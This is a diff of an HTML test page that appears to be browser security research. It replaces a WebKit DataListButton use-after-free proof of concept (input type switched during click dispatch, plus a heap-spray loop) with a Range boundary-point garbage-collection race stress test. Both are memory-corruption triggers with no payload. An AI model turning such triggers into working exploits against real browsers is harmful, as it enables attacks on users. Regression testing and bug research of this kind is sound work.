@@ -1,73 +1,299 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>WebKit DataListButton UAF PoC</title>
-    <style>
-        #input {
-            width: 320px;
-            height: 60px;
-            font-size: 24px;
-        }
-        #btn-trigger {
-            margin-top: 20px;
-            padding: 12px 24px;
-            font-size: 18px;
-        }
-    </style>
+<meta charset="utf-8">
+<title>Range BoundaryPoint GC Race Test</title>
+<style>
+    body {
+        font-family: sans-serif;
+        word-break: break-all;
+    }
+    #status {
+        white-space: pre-wrap;
+    }
+</style>
 </head>
+
 <body>
-    <input id="input" type="text" list="list">
-    <datalist id="list">
-        <option value="Opcao A">
-        <option value="Opcao B">
-    </datalist>
 
-    <br>
-    <button id="btn-trigger">Disparar Teste</button>
-    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>
+<button onclick="start()">START</button>
+<button onclick="stop()">STOP</button>
 
-    <script>
-    const input = document.getElementById('input');
-    const status = document.getElementById('status');
+<div id="status">Ready.</div>
+<div id="arena"></div>
 
-    input.addEventListener('click', (e) => {
-        status.innerText = 'Click interceptado. Alterando tipo do input...';
-        
-        // Destrói o TextFieldInputType durante a propagação do evento
-        input.type = 'button';
+<script>
+(function () {
+    "use strict";
 
-        // Opcional: Reclamação de memória / GC Heap Spray
-        for (let i = 0; i < 1000; i++) {
-            new ArrayBuffer(1024);
+    var running = false;
+    var iteration = 0;
+    var ranges = [];
+
+    var arena = document.getElementById("arena");
+    var status = document.getElementById("status");
+
+    function log(message) {
+        status.textContent =
+            "Iteration: " + iteration + "\n" +
+            "Ranges: " + ranges.length + "\n" +
+            message;
+    }
+
+    /*
+     * Cria uma árvore DOM relativamente profunda.
+     * O Range mantém boundary points em nós internos.
+     */
+    function createTree() {
+        var root = document.createElement("div");
+        var current = root;
+
+        for (var i = 0; i < 20; i++) {
+            var child = document.createElement("div");
+            var text = document.createTextNode(
+                "NODE-" + iteration + "-" + i
+            );
+
+            child.appendChild(text);
+            current.appendChild(child);
+
+            current = child;
         }
-    }, { once: true });
 
-    document.getElementById('btn-trigger').onclick = () => {
-        const rect = input.getBoundingClientRect();
-        
-        // Mira na borda direita onde o botão de lista é renderizado
-        const x = rect.left + rect.width - 15;
-        const y = rect.top + (rect.height / 2);
+        return root;
+    }
 
-        // Tenta obter o target exato na camada visual
-        const target = document.elementFromPoint(x, y) || input;
+    /*
+     * Cria vários Range objects apontando para nós
+     * que serão posteriormente modificados/removidos.
+     */
+    function createRanges(root) {
+        var created = [];
+        var node = root;
 
-        const evt = new MouseEvent('click', {
-            bubbles: true,
-            cancelable: true,
-            composed: true, // Crucial para permitir que o evento atravesse limites de Shadow DOM
-            view: window,
-            clientX: x,
-            clientY: y
-        });
+        while (node && node.firstChild) {
 
-        target.dispatchEvent(evt);
+            var range = document.createRange();
 
-        setTimeout(() => {
-            status.innerText = 'Finalizado: Sem crash imediato.';
-        }, 100);
+            try {
+                range.setStart(node, 0);
+
+                if (node.childNodes.length > 0)
+                    range.setEnd(node, node.childNodes.length);
+                else
+                    range.setEnd(node, 0);
+
+                created.push(range);
+
+            } catch (e) {
+            }
+
+            node = node.firstChild;
+        }
+
+        return created;
+    }
+
+    /*
+     * Pressão de alocação.
+     *
+     * A intenção é incentivar atividade do coletor de lixo
+     * enquanto os RangeBoundaryPoints existem.
+     */
+    function gcPressure() {
+        var junk = [];
+
+        for (var i = 0; i < 400; i++) {
+            junk.push({
+                a: new Array(200),
+                b: "GC-" + iteration + "-" + i,
+                c: {
+                    x: i,
+                    y: i + 1,
+                    z: new Array(20)
+                }
+            });
+        }
+
+        return junk;
+    }
+
+    /*
+     * Modifica a estrutura dos nós que estão sendo
+     * referenciados pelos Range objects.
+     */
+    function mutateTree(root) {
+        var current = root;
+
+        while (current) {
+
+            var next = current.firstChild;
+
+            /*
+             * Alterna o conteúdo e força mutações
+             * que fazem Range atualizar seus boundary points.
+             */
+            try {
+                if (current.firstChild &&
+                    current.firstChild.nodeType === 3) {
+
+                    var text = current.firstChild;
+
+                    if (text.length > 2) {
+                        text.splitText(
+                            Math.floor(text.length / 2)
+                        );
+                    }
+                }
+            } catch (e) {
+            }
+
+            current = next;
+        }
+    }
+
+    /*
+     * Remove completamente a árvore.
+     *
+     * Os Range objects continuam existindo em ranges[],
+     * enquanto seus boundary points precisam ser atualizados
+     * pela infraestrutura interna do DOM.
+     */
+    function destroyTree(root) {
+        try {
+            if (root.parentNode)
+                root.parentNode.removeChild(root);
+        } catch (e) {
+        }
+    }
+
+    /*
+     * Reutiliza Range objects com novos containers.
+     *
+     * Isso força setStart/setEnd repetidamente,
+     * exercitando o trecho alterado pelo commit.
+     */
+    function reuseRanges() {
+        var temporary = document.createElement("div");
+
+        for (var i = 0; i < 10; i++) {
+            temporary.appendChild(
+                document.createTextNode(
+                    "TEMP-" + iteration + "-" + i
+                )
+            );
+        }
+
+        arena.appendChild(temporary);
+
+        for (var j = 0; j < ranges.length; j++) {
+
+            var range = ranges[j];
+
+            try {
+                range.setStart(
+                    temporary,
+                    Math.min(j % 10, temporary.childNodes.length)
+                );
+
+                range.setEnd(
+                    temporary,
+                    temporary.childNodes.length
+                );
+
+            } catch (e) {
+            }
+        }
+
+        temporary.parentNode.removeChild(temporary);
+    }
+
+    function cycle() {
+
+        if (!running)
+            return;
+
+        iteration++;
+
+        /*
+         * 1. Criar árvore.
+         */
+        var root = createTree();
+        arena.appendChild(root);
+
+        /*
+         * 2. Criar Ranges apontando para a árvore.
+         */
+        var newRanges = createRanges(root);
+
+        for (var i = 0; i < newRanges.length; i++)
+            ranges.push(newRanges[i]);
+
+        /*
+         * Evita crescimento ilimitado do array,
+         * mas mantém uma quantidade significativa
+         * de Range objects vivos.
+         */
+        if (ranges.length > 500)
+            ranges.splice(0, 250);
+
+        /*
+         * 3. Criar pressão de GC.
+         */
+        var pressure1 = gcPressure();
+
+        /*
+         * 4. Modificar os nodes.
+         */
+        mutateTree(root);
+
+        /*
+         * 5. Executar mais operações de boundary.
+         */
+        reuseRanges();
+
+        /*
+         * 6. Mais pressão de GC.
+         */
+        var pressure2 = gcPressure();
+
+        /*
+         * 7. Destruir a árvore original.
+         */
+        destroyTree(root);
+
+        /*
+         * 8. Tornar as alocações anteriores descartáveis.
+         */
+        pressure1 = null;
+        pressure2 = null;
+
+        log("Running Range / DOM / GC stress...");
+
+        setTimeout(cycle, 0);
+    }
+
+    window.start = function () {
+
+        if (running)
+            return;
+
+        running = true;
+        iteration = 0;
+        ranges = [];
+
+        log("Started.");
+
+        cycle();
     };
-    </script>
+
+    window.stop = function () {
+        running = false;
+        log("Stopped.");
+    };
+
+})();
+</script>
+
 </body>
 </html>
